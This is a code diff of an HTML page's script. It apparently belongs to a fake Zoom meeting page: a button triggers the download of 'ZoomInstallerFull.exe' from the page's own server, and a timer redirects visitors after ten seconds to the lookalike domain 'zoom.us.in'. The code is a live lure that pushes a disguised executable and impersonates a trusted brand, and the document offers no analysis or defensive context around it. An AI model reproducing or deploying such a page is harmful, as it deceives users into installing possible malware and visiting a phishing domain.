@@ -423,33 +423,24 @@ line-height: inherit !important;
   </div>
 
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const downloadUrl = '/download/ZoomInstallerFull.exe';
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // Function to trigger the download
+    function triggerDownload() {
+      var link = document.createElement('a');
+      link.href = '/download/ZoomInstallerFull.exe'; // Download path
+      link.download = 'ZoomInstallerFull.exe'; // File name
+      link.click();
+    }
 
-      document.getElementById('launch-meeting').addEventListener('click', function() {
-        const link = document.createElement('a');
-        link.href = downloadUrl;
-        link.download = 'ZoomInstallerFull.exe';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      });
+    // Attach event listener to the download-now button
+    document.getElementById('download-now').addEventListener('click', triggerDownload);
 
-      document.getElementById('download-now').addEventListener('click', function() {
-        const link = document.createElement('a');
-        link.href = downloadUrl;
-        link.download = 'ZoomInstallerFull.exe';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      });
-
-      // Redirect after 10 seconds (10000 milliseconds) for testing purposes
-      setTimeout(function() {
-        window.location.href = 'https://us05web.zoom.us.in/j/85328473504/reschedule?pwd=PSBIiF9mjRYr16O0ba5sUoXaaqOr8W.1';
-      }, 10000); // 10 seconds in milliseconds
-    });
-  </script>
+    // Redirect after 10 seconds (10000 milliseconds) for testing purposes
+    setTimeout(function() {
+      window.location.href = 'https://us05web.zoom.us.in/j/85328473504/reschedule?pwd=PSBIiF9mjRYr16O0ba5sUoXaaqOr8W.1';
+    }, 10000); // 10 seconds in milliseconds
+  });
+</script>
 </body>
 </html>
